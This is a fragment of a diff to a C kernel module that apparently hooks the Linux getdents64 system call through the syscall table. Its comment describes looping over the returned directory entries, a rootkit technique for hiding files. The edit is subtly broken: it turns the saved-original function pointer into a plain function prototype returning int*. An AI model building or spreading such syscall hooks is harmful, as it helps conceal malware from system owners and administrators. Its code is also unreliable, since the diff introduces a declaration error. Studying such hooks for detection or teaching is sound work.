@@ -12,9 +12,9 @@
 
 uint64_t **sct;
 
-asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage int *getdents64_original (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
-asmlinkage int   getdents64_hook      (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+asmlinkage int  getdents64_hook     (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
 /*
 run the actual system call,
 loop through the structs returned,
